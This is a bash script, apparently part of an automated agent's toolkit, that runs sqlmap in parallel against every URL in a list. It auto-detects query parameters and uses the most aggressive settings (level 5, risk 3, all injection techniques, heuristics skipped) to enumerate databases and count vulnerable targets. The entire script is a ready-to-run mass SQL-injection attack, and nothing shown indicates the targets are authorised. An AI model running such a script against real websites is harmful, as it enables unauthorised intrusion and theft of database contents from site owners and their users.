#!/bin/bash
cd "$WORK_PATH"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
run_one(){
  idx="$1"; u="$2"
  d=tool_outputs/ph/sm_$idx; mkdir -p "$d"
  params=$(python3 - "$u" <<'PY'
import sys,urllib.parse
q=urllib.parse.urlparse(sys.argv[1]).query
print(','.join(sorted(set(k for k,_ in urllib.parse.parse_qsl(q,keep_blank_values=True)))))
PY
)
  if [ -z "$params" ]; then params="id"; fi
  sqlmap -u "$u" --batch --level=5 --risk=3 --dbs --threads=4 \
    --output-dir="$d" -p "$params" --technique=BEUSTQ --skip-heuristic > "$d/run.log" 2>&1
  echo "DONE $idx $(grep -c 'is vulnerable' "$d/run.log")" >> tool_outputs/ph/SM_STATUS
}
export -f run_one
export WORK_PATH
i=0
: > tool_outputs/ph/SM_STATUS
while read -r u; do
  i=$((i+1))
  run_one "$i" "$u" &
  # keep max ~5 parallel
  while [ "$(jobs -r | wc -l)" -ge 5 ]; do sleep 2; done
done < tool_outputs/ph/urls.txt
wait
echo ALLDONE >> tool_outputs/ph/SM_STATUS
